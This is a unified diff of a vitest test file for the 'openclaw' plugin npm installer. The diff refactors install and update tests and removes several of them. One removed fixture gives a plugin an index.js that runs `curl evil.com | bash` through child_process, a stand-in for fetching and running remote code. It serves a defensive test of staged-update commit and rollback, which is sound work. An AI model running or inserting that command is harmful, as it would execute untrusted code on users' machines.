@@ -3,9 +3,10 @@ import fs from "node:fs";
 import { createRequire } from "node:module";
 import path from "node:path";
 import { pathToFileURL } from "node:url";
-import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
+import { afterAll, assert, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
+import "../test-utils/prepare-compiled-subprocesses.js";
+import { npmCommandArgs } from "../test-utils/npm-command.js";
 import {
-  expectIntegrityDriftRejected,
   mockNpmViewMetadataResult,
   npmCommandFailureCases,
 } from "../test-utils/npm-spec-install-test-helpers.js";
@@ -29,6 +30,7 @@ import {
   markRetainedManagedNpmInstall,
 } from "./managed-npm-retention.js";
 import { createSyncSuiteTempRootTracker } from "./test-helpers/fs-fixtures.js";
+import { registerNpmUpdateMetadataTests } from "./update-npm-metadata.test-support.js";
 
 const runCommandWithTimeoutMock = vi.fn();
 const resolveOpenClawPackageRootSyncMock = vi.fn();
@@ -44,26 +46,28 @@ vi.mock("../infra/openclaw-root.js", () => ({
 
 vi.resetModules();
 
-const { installPluginFromNpmPackArchive, installPluginFromNpmSpec, PLUGIN_INSTALL_ERROR_CODE } =
-  await import("./install.js");
+const {
+  installPluginFromNpmPackArchive: installPack,
+  installPluginFromNpmSpec: installSpec,
+  PLUGIN_INSTALL_ERROR_CODE,
+} = await import("./install.js");
 
 const suiteTempRootTracker = createSyncSuiteTempRootTracker("openclaw-plugin-install-npm-spec");
 let previousNpmGlobalConfig: string | undefined;
 let npmGlobalConfigPath: string;
-let npmPackArchiveInstallCase: {
-  archivePath: string;
-  calls: unknown[][];
-  dependencySpec: string | undefined;
-  npmRoot: string;
-  result: Awaited<ReturnType<typeof installPluginFromNpmPackArchive>>;
-  stagedArchiveContents: string;
-};
-let npmSpecInstallCase: {
-  calls: unknown[][];
-  dependencyInstalled: boolean;
-  npmRoot: string;
-  result: Awaited<ReturnType<typeof installPluginFromNpmSpec>>;
-};
+let npmRoot: string;
+const silentLogger = { info: () => {}, warn: () => {} };
+function installPluginFromNpmSpec(params: Parameters<typeof installSpec>[0]) {
+  return installSpec({ npmDir: npmRoot, logger: silentLogger, ...params });
+}
+
+function installPluginFromNpmPackArchive(params: Parameters<typeof installPack>[0]) {
+  return installPack({ npmDir: npmRoot, logger: silentLogger, ...params });
+}
+
+function writeJson(filePath: string, value: unknown): void {
+  fs.writeFileSync(filePath, `${JSON.stringify(value, null, 2)}\n`, "utf8");
+}
 
 function successfulSpawn(stdout = "") {
   return {
@@ -77,52 +81,35 @@ function successfulSpawn(stdout = "") {
 }
 
 function failedSpawn(stderr: string, stdout = "") {
-  return {
-    code: 1,
-    stdout,
-    stderr,
-    signal: null,
-    killed: false,
-    termination: "exit" as const,
-  };
+  return { ...successfulSpawn(stdout), code: 1, stderr };
 }
 
-function npmViewArgv(spec: string): string[] {
-  return [
-    "npm",
-    "view",
-    spec,
-    "name",
-    "version",
-    "dist.integrity",
-    "dist.shasum",
-    "openclaw",
-    "--json",
-  ];
+function npmViewArgs(spec: string): string[] {
+  return ["view", spec, "name", "version", "dist.integrity", "dist.shasum", "openclaw", "--json"];
 }
 
-function npmViewVersionsArgv(spec: string): string[] {
-  return ["npm", "view", spec, "versions", "--json"];
+function npmViewVersionsArgs(spec: string): string[] {
+  return ["view", spec, "versions", "--json"];
 }
 
-function npmPackArchiveMetadataArgv(archivePath: string): string[] {
-  return ["npm", "pack", archivePath, "--ignore-scripts", "--dry-run", "--json"];
+function npmPackArchiveMetadataArgs(archivePath: string): string[] {
+  return ["pack", archivePath, "--ignore-scripts", "--dry-run", "--json"];
 }
 
 function commandKey(argv: readonly string[]): string {
   return argv.join("\0");
 }
 
-function resolveManagedFileDependency(npmRoot: string, dependencySpec: string): string | null {
+function resolveManagedFileDependency(projectRoot: string, dependencySpec: string): string | null {
   if (!dependencySpec.startsWith("file:")) {
     return null;
   }
   const rawPath = dependencySpec.slice("file:".length);
-  return path.isAbsolute(rawPath) ? rawPath : path.resolve(npmRoot, rawPath);
+  return path.isAbsolute(rawPath) ? rawPath : path.resolve(projectRoot, rawPath);
 }
 
 function isNpmInstallCommand(argv: unknown): argv is string[] {
-  return Array.isArray(argv) && argv[0] === "npm" && argv[1] === "install";
+  return Array.isArray(argv) && npmCommandArgs(argv)?.[0] === "install";
 }
 
 function isNpmPeerPlannerInstallCommand(argv: unknown): argv is string[] {
@@ -133,58 +120,11 @@ function isManagedNpmInstallCommand(argv: unknown): argv is string[] {
   return isNpmInstallCommand(argv) && !isNpmPeerPlannerInstallCommand(argv);
 }
 
-function managedNpmRootHasDependency(npmRoot: string, packageName: string): boolean {
-  const manifest = JSON.parse(fs.readFileSync(path.join(npmRoot, "package.json"), "utf8")) as {
+function managedNpmRootHasDependency(projectRoot: string, packageName: string): boolean {
+  const manifest = JSON.parse(fs.readFileSync(path.join(projectRoot, "package.json"), "utf8")) as {
     dependencies?: Record<string, string>;
   };
   return packageName in (manifest.dependencies ?? {});
-}
-
-function expectNpmInstallIntoRoot(params: {
-  calls: unknown[][];
-  npmRoot: string;
-  expectedFreshnessBypass?: "before";
-}) {
-  const installCalls = params.calls.filter((call) => isManagedNpmInstallCommand(call[0]));
-  expect(installCalls).toHaveLength(1);
-  const installOptions = installCalls[0]?.[1] as
-    | { cwd?: unknown; env?: Record<string, string | undefined> }
-    | undefined;
-  expect(typeof installOptions?.cwd).toBe("string");
-  const stageRoot = String(installOptions?.cwd);
-  expect(stageRoot).not.toBe(params.npmRoot);
-  expect(path.dirname(stageRoot)).toBe(path.dirname(params.npmRoot));
-  expect(fs.existsSync(stageRoot)).toBe(false);
-  expect(fs.existsSync(path.join(params.npmRoot, "package.json"))).toBe(true);
-  expect(installCalls[0]?.[0]).toEqual([
-    "npm",
-    "install",
-    "--omit=dev",
-    "--omit=peer",
-    "--legacy-peer-deps",
-    "--loglevel=error",
-    "--ignore-scripts",
-    "--no-audit",
-    "--no-fund",
-  ]);
-  if (params.expectedFreshnessBypass === "before") {
-    expect(installOptions?.env?.npm_config_before).toBeTruthy();
-    expect(installOptions?.env?.npm_config_min_release_age).toBe("");
-  }
-}
-
-function expectNpmInstallIntoProject(params: {
-  calls: unknown[][];
-  npmRoot: string;
-  packageName: string;
-}) {
-  expectNpmInstallIntoRoot({
-    calls: params.calls,
-    npmRoot: resolvePluginNpmProjectDir({
-      npmDir: params.npmRoot,
-      packageName: params.packageName,
-    }),
-  });
 }
 
 function expectManagedNpmQuarantine(diagnostics: string[]): string {
@@ -205,10 +145,10 @@ function expectManagedNpmQuarantine(diagnostics: string[]): string {
   return quarantineDir;
 }
 
-function resolveTestPluginPackageDir(npmRoot: string, packageName: string): string {
+function resolveTestPluginPackageDir(projectRoot: string, packageName: string): string {
   return path.join(
     resolvePluginNpmProjectDir({
-      npmDir: npmRoot,
+      npmDir: projectRoot,
       packageName,
     }),
     "node_modules",
@@ -270,19 +210,15 @@ function writeInstalledNpmPlugin(params: {
     fs.rmSync(pluginDir, { recursive: true, force: true });
   }
   fs.mkdirSync(path.join(pluginDir, "dist"), { recursive: true });
-  fs.writeFileSync(
-    path.join(pluginDir, "package.json"),
-    JSON.stringify({
-      name: params.packageName,
-      version: params.version,
-      openclaw: params.openclaw ?? { extensions: ["./dist/index.js"] },
-      ...(params.dependency
-        ? { dependencies: { [params.dependency.name]: params.dependency.version } }
-        : {}),
-      ...(params.peerDependencies ? { peerDependencies: params.peerDependencies } : {}),
-    }),
-    "utf-8",
-  );
+  writeJson(path.join(pluginDir, "package.json"), {
+    name: params.packageName,
+    version: params.version,
+    openclaw: params.openclaw ?? { extensions: ["./dist/index.js"] },
+    ...(params.dependency
+      ? { dependencies: { [params.dependency.name]: params.dependency.version } }
+      : {}),
+    ...(params.peerDependencies ? { peerDependencies: params.peerDependencies } : {}),
+  });
   if (params.nativeManifest !== "missing") {
     fs.writeFileSync(
       path.join(pluginDir, "openclaw.plugin.json"),
@@ -310,26 +246,18 @@ function writeInstalledNpmPlugin(params: {
   if (params.dependency) {
     const depDir = path.join(pluginDir, "node_modules", params.dependency.name);
     fs.mkdirSync(depDir, { recursive: true });
-    fs.writeFileSync(
-      path.join(depDir, "package.json"),
-      JSON.stringify({
-        name: params.dependency.name,
-        version: params.dependency.version,
-      }),
-      "utf-8",
-    );
+    writeJson(path.join(depDir, "package.json"), {
+      name: params.dependency.name,
+      version: params.dependency.version,
+    });
   }
   if (params.hoistedDependency) {
     const depDir = path.join(params.npmRoot, "node_modules", params.hoistedDependency.name);
     fs.mkdirSync(depDir, { recursive: true });
-    fs.writeFileSync(
-      path.join(depDir, "package.json"),
-      JSON.stringify({
-        name: params.hoistedDependency.name,
-        version: params.hoistedDependency.version,
-      }),
-      "utf-8",
-    );
+    writeJson(path.join(depDir, "package.json"), {
+      name: params.hoistedDependency.name,
+      version: params.hoistedDependency.version,
+    });
   }
   return pluginDir;
 }
@@ -391,11 +319,10 @@ function writeNpmRootPackageLock(params: {
       };
     }
   }
-  fs.writeFileSync(
-    path.join(params.npmRoot, "package-lock.json"),
-    `${JSON.stringify({ lockfileVersion: 3, packages: lockPackages }, null, 2)}\n`,
-    "utf-8",
-  );
+  writeJson(path.join(params.npmRoot, "package-lock.json"), {
+    lockfileVersion: 3,
+    packages: lockPackages,
+  });
 }
 
 function writeMissingCurrentPlatformOptionalPackage(params: {
@@ -415,15 +342,30 @@ function writeMissingCurrentPlatformOptionalPackage(params: {
     os: [process.platform],
     cpu: [process.arch],
   };
-  fs.writeFileSync(lockPath, `${JSON.stringify(lockfile, null, 2)}\n`, "utf8");
+  writeJson(lockPath, lockfile);
   fs.rmSync(path.join(params.npmRoot, ...params.packageLocation.split("/")), {
     recursive: true,
     force: true,
   });
 }
 
-function mockNpmViewAndInstall(params: MockNpmPackage & { spec: string }) {
-  mockNpmViewAndInstallMany([params]);
+function mockNpmViewAndInstall(
+  params: Omit<MockNpmPackage, "npmRoot" | "packageName" | "version"> & {
+    spec: string;
+    npmRoot?: string;
+    packageName?: string;
+    version?: string;
+  },
+) {
+  const selector = params.spec.lastIndexOf("@");
+  mockNpmViewAndInstallMany([
+    Object.assign(params, {
+      npmRoot: params.npmRoot ?? npmRoot,
+      packageName:
+        params.packageName ?? (selector > 0 ? params.spec.slice(0, selector) : params.spec),
+      version: params.version ?? "1.0.0",
+    }),
+  ]);
 }
 
 function mockNpmViewAndInstallMany(packages: MockNpmPackage[]) {
@@ -431,19 +373,23 @@ function mockNpmViewAndInstallMany(packages: MockNpmPackage[]) {
   const packPackagesByArgv = new Map(
     packages
       .filter((pkg) => pkg.packArchivePath)
-      .map((pkg) => [commandKey(npmPackArchiveMetadataArgv(pkg.packArchivePath ?? "")), pkg]),
+      .map((pkg) => [commandKey(npmPackArchiveMetadataArgs(pkg.packArchivePath ?? "")), pkg]),
   );
   const viewPackagesByArgv = new Map(
-    packages.filter((pkg) => pkg.spec).map((pkg) => [commandKey(npmViewArgv(pkg.spec ?? "")), pkg]),
+    packages.filter((pkg) => pkg.spec).map((pkg) => [commandKey(npmViewArgs(pkg.spec ?? "")), pkg]),
   );
   const versionsPackagesByArgv = new Map(
     packages
       .filter((pkg) => pkg.versions)
-      .map((pkg) => [commandKey(npmViewVersionsArgv(pkg.packageName)), pkg]),
+      .map((pkg) => [commandKey(npmViewVersionsArgs(pkg.packageName)), pkg]),
   );
   runCommandWithTimeoutMock.mockImplementation(
     async (argv: string[], options?: { cwd?: string }) => {
-      const argvKey = commandKey(argv);
+      const npmArgs = npmCommandArgs(argv);
+      if (!npmArgs) {
+        throw new Error(`unexpected command: ${argv.join(" ")}`);
+      }
+      const argvKey = commandKey(npmArgs);
       const packPackage = packPackagesByArgv.get(argvKey);
       if (packPackage) {
         return successfulSpawn(
@@ -484,17 +430,17 @@ function mockNpmViewAndInstallMany(packages: MockNpmPackage[]) {
         );
       }
       if (isNpmPeerPlannerInstallCommand(argv)) {
-        const npmRoot = options?.cwd;
-        if (!npmRoot) {
+        const projectRoot = options?.cwd;
+        if (!projectRoot) {
           throw new Error(`unexpected npm peer planner command: ${argv.join(" ")}`);
         }
         const manifest = JSON.parse(
-          fs.readFileSync(path.join(npmRoot, "package.json"), "utf8"),
+          fs.readFileSync(path.join(projectRoot, "package.json"), "utf8"),
         ) as {
           dependencies?: Record<string, string>;
         };
         writeNpmRootPackageLock({
-          npmRoot,
+          npmRoot: projectRoot,
           dependencies: manifest.dependencies ?? {},
           packages: Object.keys(manifest.dependencies ?? {})
             .map((packageName) => packagesByName.get(packageName))
@@ -503,26 +449,25 @@ function mockNpmViewAndInstallMany(packages: MockNpmPackage[]) {
         return successfulSpawn();
       }
       if (isManagedNpmInstallCommand(argv)) {
-        const npmRoot = options?.cwd;
-        if (!npmRoot) {
+        const projectRoot = options?.cwd;
+        if (!projectRoot) {
           throw new Error(`unexpected npm install command: ${(argv as string[]).join(" ")}`);
         }
         const manifest = JSON.parse(
-          fs.readFileSync(path.join(npmRoot, "package.json"), "utf8"),
+          fs.readFileSync(path.join(projectRoot, "package.json"), "utf8"),
         ) as {
           dependencies?: Record<string, string>;
         };
         const installedPackages: MockNpmPackage[] = [];
-        prunePluginLocalOpenClawPeerLinks(npmRoot);
+        prunePluginLocalOpenClawPeerLinks(projectRoot);
         for (const packageName of Object.keys(manifest.dependencies ?? {})) {
           if (packageName === "openclaw") {
-            const openclawRoot = path.join(npmRoot, "node_modules", "openclaw");
+            const openclawRoot = path.join(projectRoot, "node_modules", "openclaw");
             fs.mkdirSync(openclawRoot, { recursive: true });
-            fs.writeFileSync(
-              path.join(openclawRoot, "package.json"),
-              JSON.stringify({ name: "openclaw", version: "0.0.0-test" }),
-              "utf8",
-            );
+            writeJson(path.join(openclawRoot, "package.json"), {
+              name: "openclaw",
+              version: "0.0.0-test",
+            });
             continue;
           }
           const pkg = packagesByName.get(packageName);
@@ -536,42 +481,41 @@ function mockNpmViewAndInstallMany(packages: MockNpmPackage[]) {
             );
           }
           const fileDependencyPath = dependencySpec
-            ? resolveManagedFileDependency(npmRoot, dependencySpec)
+            ? resolveManagedFileDependency(projectRoot, dependencySpec)
             : null;
           if (fileDependencyPath && !fs.existsSync(fileDependencyPath)) {
             throw new Error(`missing managed npm file dependency: ${fileDependencyPath}`);
           }
           writeInstalledNpmPlugin({
             ...pkg,
-            npmRoot,
+            npmRoot: projectRoot,
             version: pkg.installedVersion ?? pkg.version,
           });
           if (pkg.materializesRootOpenClaw) {
-            const openclawRoot = path.join(npmRoot, "node_modules", "openclaw");
+            const openclawRoot = path.join(projectRoot, "node_modules", "openclaw");
             fs.mkdirSync(openclawRoot, { recursive: true });
-            fs.writeFileSync(
-              path.join(openclawRoot, "package.json"),
-              JSON.stringify({ name: "openclaw", version: "2026.5.3" }),
-              "utf8",
-            );
+            writeJson(path.join(openclawRoot, "package.json"), {
+              name: "openclaw",
+              version: "2026.5.3",
+            });
           }
           installedPackages.push(pkg);
         }
         writeNpmRootPackageLock({
-          npmRoot,
+          npmRoot: projectRoot,
           dependencies: manifest.dependencies ?? {},
           packages: installedPackages,
         });
         return successfulSpawn();
       }
-      if (argv[0] === "npm" && argv[1] === "uninstall") {
+      if (npmArgs[0] === "uninstall") {
         const packageName = (argv as string[]).at(-1);
         if (packageName === "openclaw") {
-          const npmRoot = options?.cwd;
-          if (!npmRoot) {
+          const projectRoot = options?.cwd;
+          if (!projectRoot) {
             throw new Error(`unexpected npm uninstall command: ${(argv as string[]).join(" ")}`);
           }
-          fs.rmSync(path.join(npmRoot, "node_modules", "openclaw"), {
+          fs.rmSync(path.join(projectRoot, "node_modules", "openclaw"), {
             recursive: true,
             force: true,
           });
@@ -612,126 +556,27 @@ afterAll(() => {
 });
 
 beforeEach(() => {
+  npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
   runCommandWithTimeoutMock.mockReset();
   resolveOpenClawPackageRootSyncMock.mockReset();
   const hostRoot = suiteTempRootTracker.makeTempDir();
-  fs.writeFileSync(
-    path.join(hostRoot, "package.json"),
-    `${JSON.stringify({ name: "openclaw", version: "0.0.0-test" }, null, 2)}\n`,
-    "utf8",
-  );
+  writeJson(path.join(hostRoot, "package.json"), { name: "openclaw", version: "0.0.0-test" });
   resolveOpenClawPackageRootSyncMock.mockReturnValue(hostRoot);
   vi.unstubAllEnvs();
   process.env.NPM_CONFIG_GLOBALCONFIG = npmGlobalConfigPath;
 });
 
-beforeAll(async () => {
-  runCommandWithTimeoutMock.mockReset();
-  resolveOpenClawPackageRootSyncMock.mockReset();
-  const hostRoot = suiteTempRootTracker.makeTempDir();
-  fs.writeFileSync(
-    path.join(hostRoot, "package.json"),
-    `${JSON.stringify({ name: "openclaw", version: "0.0.0-test" }, null, 2)}\n`,
-    "utf8",
-  );
-  resolveOpenClawPackageRootSyncMock.mockReturnValue(hostRoot);
-  process.env.NPM_CONFIG_GLOBALCONFIG = npmGlobalConfigPath;
-
-  const stateDir = suiteTempRootTracker.makeTempDir();
-  const npmRoot = path.join(stateDir, "npm");
-  const archivePath = path.join(stateDir, "openclaw-pack-demo-1.2.3.tgz");
-  fs.writeFileSync(archivePath, "fixture pack contents", "utf8");
-
-  mockNpmViewAndInstallMany([
-    {
-      packageName: "@openclaw/pack-demo",
-      version: "1.2.3",
-      pluginId: "pack-demo",
-      npmRoot,
-      integrity: "sha512-pack-demo",
-      shasum: "packdemosha",
-      packArchivePath: archivePath,
-    },
-    {
-      spec: "@openclaw/voice-call@0.0.1",
-      packageName: "@openclaw/voice-call",
-      version: "0.0.1",
-      pluginId: "voice-call",
-      npmRoot,
-    },
-  ]);
-
-  const result = await installPluginFromNpmPackArchive({
-    archivePath,
-    npmDir: npmRoot,
-    logger: { info: () => {}, warn: () => {} },
-  });
-  const npmProjectRoot = resolvePluginNpmProjectDir({
-    npmDir: npmRoot,
-    packageName: "@openclaw/pack-demo",
-  });
-  const managedManifest = JSON.parse(
-    await fs.promises.readFile(path.join(npmProjectRoot, "package.json"), "utf8"),
-  ) as { dependencies?: Record<string, string> };
-  const dependencySpec = managedManifest.dependencies?.["@openclaw/pack-demo"];
-  const stagedArchivePath = dependencySpec
-    ? resolveManagedFileDependency(npmProjectRoot, dependencySpec)
-    : null;
-  if (stagedArchivePath === null) {
-    throw new Error("expected staged archive path");
-  }
-  npmPackArchiveInstallCase = {
-    archivePath,
-    calls: [...runCommandWithTimeoutMock.mock.calls],
-    dependencySpec,
-    npmRoot,
-    result,
-    stagedArchiveContents: await fs.promises.readFile(stagedArchivePath, "utf8"),
-  };
-});
-
-beforeAll(async () => {
-  runCommandWithTimeoutMock.mockReset();
-  resolveOpenClawPackageRootSyncMock.mockReset();
-  const hostRoot = suiteTempRootTracker.makeTempDir();
-  fs.writeFileSync(
-    path.join(hostRoot, "package.json"),
-    `${JSON.stringify({ name: "openclaw", version: "0.0.0-test" }, null, 2)}\n`,
-    "utf8",
-  );
-  resolveOpenClawPackageRootSyncMock.mockReturnValue(hostRoot);
-  process.env.NPM_CONFIG_GLOBALCONFIG = npmGlobalConfigPath;
-
-  const stateDir = suiteTempRootTracker.makeTempDir();
-  const npmRoot = path.join(stateDir, "npm");
-
-  mockNpmViewAndInstall({
-    spec: "@openclaw/voice-call@0.0.1",
-    packageName: "@openclaw/voice-call",
-    version: "0.0.1",
-    pluginId: "voice-call",
-    npmRoot,
-    dependency: { name: "is-number", version: "7.0.0" },
-  });
-
-  const result = await installPluginFromNpmSpec({
-    spec: "@openclaw/voice-call@0.0.1",
-    npmDir: npmRoot,
-    logger: { info: () => {}, warn: () => {} },
-  });
-
-  npmSpecInstallCase = {
-    calls: [...runCommandWithTimeoutMock.mock.calls],
-    dependencyInstalled:
-      result.ok &&
-      fs.existsSync(path.join(result.targetDir, "node_modules", "is-number", "package.json")),
-    npmRoot,
-    result,
-  };
-});
-
 describe("installPluginFromNpmSpec", () => {
-  it.each(npmCommandFailureCases)(
+  registerNpmUpdateMetadataTests({
+    getNpmRoot: () => npmRoot,
+    installPluginFromNpmSpec,
+    isManagedNpmInstallCommand,
+    mockNpmViewAndInstallMany,
+    runCommandWithTimeoutMock,
+    writeInstalledNpmPlugin,
+  });
+
+  it.each(npmCommandFailureCases.filter(({ label }) => label === "signal without output"))(
     "classifies metadata failures with $label",
     async ({ npmResult, expectedDetail }) => {
       runCommandWithTimeoutMock.mockResolvedValue(npmResult);
@@ -740,7 +585,6 @@ describe("installPluginFromNpmSpec", () => {
         installPluginFromNpmSpec({
           spec: "@openclaw/voice-call@0.0.1",
           npmDir: path.join(suiteTempRootTracker.makeTempDir(), "npm"),
-          logger: { info: () => {}, warn: () => {} },
         }),
       ).resolves.toEqual({
         ok: false,
@@ -751,14 +595,9 @@ describe("installPluginFromNpmSpec", () => {
   );
 
   it("continues when the managed generation scan reports ENOTDIR", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     const packageName = "scan-recovery-plugin";
     mockNpmViewAndInstall({
       spec: `${packageName}@1.0.0`,
-      packageName,
-      version: "1.0.0",
-      pluginId: packageName,
-      npmRoot,
     });
     const error = Object.assign(new Error("not a directory"), { code: "ENOTDIR" });
     const readdirSpy = vi.spyOn(fs.promises, "readdir").mockRejectedValueOnce(error);
@@ -766,8 +605,6 @@ describe("installPluginFromNpmSpec", () => {
     try {
       const result = await installPluginFromNpmSpec({
         spec: `${packageName}@1.0.0`,
-        npmDir: npmRoot,
-        logger: { info: () => {}, warn: () => {} },
       });
 
       expect(result.ok).toBe(true);
@@ -779,32 +616,9 @@ describe("installPluginFromNpmSpec", () => {
     }
   });
 
-  it("installs npm pack archives through the managed npm root", async () => {
-    const { archivePath, calls, dependencySpec, npmRoot, result, stagedArchiveContents } =
-      npmPackArchiveInstallCase;
-
-    expect(result.ok).toBe(true);
-    if (!result.ok) {
-      return;
-    }
-    expect(result.pluginId).toBe("pack-demo");
-    expect(result.targetDir).toBe(resolveTestPluginPackageDir(npmRoot, "@openclaw/pack-demo"));
-    expect(result.npmResolution?.resolvedSpec).toBe("@openclaw/pack-demo@1.2.3");
-    expect(result.npmResolution?.integrity).toBe("sha512-pack-demo");
-    expect(result.npmTarballName).toBe("openclaw-pack-demo-1.2.3.tgz");
-    expectNpmInstallIntoProject({
-      calls,
-      npmRoot,
-      packageName: "@openclaw/pack-demo",
-    });
-    expect(dependencySpec).toMatch(/^file:\.\/_openclaw-pack-archives\/.+\.tgz$/);
-    expect(dependencySpec).not.toContain(archivePath);
-    expect(stagedArchiveContents).toBe("fixture pack contents");
-  });
-
   it("rejects npm pack archive metadata with traversal package names", async () => {
     const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
+    npmRoot = path.join(stateDir, "npm");
     const victimDir = path.join(stateDir, "victim");
     const archivePath = path.join(stateDir, "evil-pack-1.0.0.tgz");
     fs.mkdirSync(victimDir, { recursive: true });
@@ -822,8 +636,6 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmPackArchive({
       archivePath,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
       mode: "update",
     });
 
@@ -838,240 +650,20 @@ describe("installPluginFromNpmSpec", () => {
     expect(runCommandWithTimeoutMock.mock.calls).toHaveLength(1);
   });
 
-  it.each(["fresh", "existing"] as const)(
-    "keeps the %s install target untouched while artifact consent runs",
-    async (targetState) => {
-      const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-      const packageName = "stage-consent-plugin";
-      const fixture = (version: string) => ({
-        spec: `${packageName}@${version}`,
-        packageName,
-        version,
-        pluginId: packageName,
-        npmRoot,
-        replaceExisting: true,
-        indexJs: "export const value = 'validated';\n",
-      });
-      let targetDir = resolveTestPluginPackageDir(npmRoot, packageName);
-      if (targetState === "existing") {
-        for (const version of ["1.0.0", "2.0.0"]) {
-          mockNpmViewAndInstall(fixture(version));
-          const installed = await installPluginFromNpmSpec({
-            spec: `${packageName}@${version}`,
-            npmDir: npmRoot,
-            mode: "update",
-            logger: { info: () => {}, warn: () => {} },
-          });
-          expect(installed.ok).toBe(true);
-          if (!installed.ok) {
-            return;
-          }
-          targetDir = installed.targetDir;
-        }
-        fs.writeFileSync(path.join(targetDir, "before-consent.txt"), "keep until consent", "utf8");
-      }
-      const projectRoot = path.dirname(path.dirname(targetDir));
-      const projectBefore = targetState === "existing" ? readTextFileTree(projectRoot) : undefined;
-      mockNpmViewAndInstall(fixture("2.0.0"));
-      const onBeforePluginArtifactCommit = vi.fn(
-        async (artifact: PluginInstallArtifactConsentRequest) => {
-          expect(fs.existsSync(targetDir)).toBe(targetState === "existing");
-          if (targetState === "existing") {
-            expect(readTextFileTree(projectRoot)).toEqual(projectBefore);
-            expect(artifact.currentArtifactDir).toBe(targetDir);
-          }
-          expect(artifact.stagedArtifactDir).not.toBe(targetDir);
-          expect(fs.existsSync(path.join(artifact.stagedArtifactDir, "package.json"))).toBe(true);
-        },
-      );
-      const result = await installPluginFromNpmSpec({
-        spec: `${packageName}@2.0.0`,
-        npmDir: npmRoot,
-        ...(targetState === "existing" ? { mode: "update" as const } : {}),
-        logger: { info: () => {}, warn: () => {} },
-        onBeforePluginArtifactCommit,
-      });
-      expect(result.ok).toBe(true);
-      expect(onBeforePluginArtifactCommit).toHaveBeenCalledTimes(1);
-      if (result.ok) {
-        expect(result.targetDir).toBe(targetDir);
-        expect(fs.readFileSync(path.join(targetDir, "dist", "index.js"), "utf8")).toBe(
-          "export const value = 'validated';\n",
-        );
-      }
-    },
-  );
-
-  it.each(["npm", "npm-pack"] as const)(
-    "preserves a successor %s project when an older install rolls back after losing ownership",
-    async (source) => {
-      const stateDir = suiteTempRootTracker.makeTempDir();
-      const npmRoot = path.join(stateDir, "npm");
-      const packageName = "rollback-owner-plugin";
-      const expired = new Error("install owner closed");
-      let ownerActive = true;
-      const assertOwned = () => {
-        if (!ownerActive) {
-          throw expired;
-        }
-      };
-      const install = async (version: string, guard = () => {}) => {
-        const spec = `${packageName}@${version}`;
-        const archivePath = path.join(stateDir, `${packageName}-${version}.tgz`);
-        fs.writeFileSync(archivePath, `archive ${version}`, "utf8");
-        mockNpmViewAndInstallMany([
-          { spec, packArchivePath: archivePath, packageName, version, npmRoot },
-        ]);
-        const params = requestDeferredPluginInstall(
-          { npmDir: npmRoot, mode: "update" as const },
-          undefined,
-          guard,
-        );
-        const result =
-          source === "npm"
-            ? await installPluginFromNpmSpec({ ...params, spec })
-            : await installPluginFromNpmPackArchive({ ...params, archivePath });
-        if (!result.ok) {
-          throw new Error(result.error);
-        }
-        const transaction = resolvePluginInstallTransaction(result);
-        if (!transaction) {
-          throw new Error("expected deferred npm install");
-        }
-        return { result, transaction };
-      };
-
-      const initial = await install("1.0.0");
-      await initial.transaction.commit();
-      const older = await install("2.0.0", assertOwned);
-      ownerActive = false;
-      const successor = await install("2.0.0");
-      await successor.transaction.commit();
-      expect(successor.result.targetDir).toBe(older.result.targetDir);
-      const projectRoot = resolveTestPluginGenerationProjectDir({
-        npmRoot,
-        packageName,
-        version: "2.0.0",
-      });
-      const projectBefore = readTextFileTree(projectRoot);
-      if (source === "npm-pack") {
-        expect(Object.keys(projectBefore).some((file) => file.endsWith(".tgz"))).toBe(true);
-      }
-
-      const rollbackError = await older.transaction.rollback().then(
-        () => undefined,
-        (error: unknown) => error,
-      );
-      expect.soft(rollbackError).toBe(expired);
-      expect(fs.existsSync(projectRoot)).toBe(true);
-      expect(readTextFileTree(projectRoot)).toEqual(projectBefore);
-    },
-  );
-
-  it.each(["commit", "rollback"] as const)(
-    "settles staged npm pack updates with %s",
-    async (settlement) => {
-      const stateDir = suiteTempRootTracker.makeTempDir();
-      const npmRoot = path.join(stateDir, "npm");
-      const packageName = "@openclaw/pack-demo";
-      const archiveV1Path = path.join(stateDir, "openclaw-pack-demo-1.0.0.tgz");
-      const archiveV2Path = path.join(stateDir, "openclaw-pack-demo-2.0.0.tgz");
-      fs.writeFileSync(archiveV1Path, "v1 pack contents", "utf8");
-      fs.writeFileSync(archiveV2Path, "v2 pack contents", "utf8");
-
-      mockNpmViewAndInstallMany([
-        {
-          packageName,
-          version: "1.0.0",
-          pluginId: "pack-demo",
-          npmRoot,
-          integrity: "sha512-pack-demo-v1",
-          shasum: "packdemoshav1",
-          packArchivePath: archiveV1Path,
-          indexJs: "export const ok = true;",
-        },
-      ]);
-
-      const safeInstall = await installPluginFromNpmPackArchive({
-        archivePath: archiveV1Path,
-        npmDir: npmRoot,
-        logger: { info: () => {}, warn: () => {} },
-      });
-      expect(safeInstall.ok).toBe(true);
-      const npmProjectRoot = resolvePluginNpmProjectDir({
-        npmDir: npmRoot,
-        packageName,
-      });
-      const projectBefore = readTextFileTree(npmProjectRoot);
-
-      mockNpmViewAndInstallMany([
-        {
-          packageName,
-          version: "2.0.0",
-          pluginId: "pack-demo",
-          npmRoot,
-          integrity: "sha512-pack-demo-v2",
-          shasum: "packdemoshav2",
-          packArchivePath: archiveV2Path,
-          indexJs: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
-        },
-      ]);
-
-      const update = await installPluginFromNpmPackArchive(
-        requestDeferredPluginInstall({
-          archivePath: archiveV2Path,
-          npmDir: npmRoot,
-          mode: "update",
-          logger: { info: () => {}, warn: () => {} },
-        }),
-      );
-
-      expect(update.ok).toBe(true);
-      if (!update.ok) {
-        return;
-      }
-      const updateGenerationRoot = resolvePluginNpmGenerationProjectDir({
-        npmDir: npmRoot,
-        packageName,
-        generationKey: [
-          packageName,
-          "2.0.0",
-          `${packageName}@2.0.0`,
-          "sha512-pack-demo-v2",
-          "packdemoshav2",
-        ].join("\n"),
-      });
-      expect(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);
-      expect(readTextFileTree(updateGenerationRoot)).not.toEqual(projectBefore);
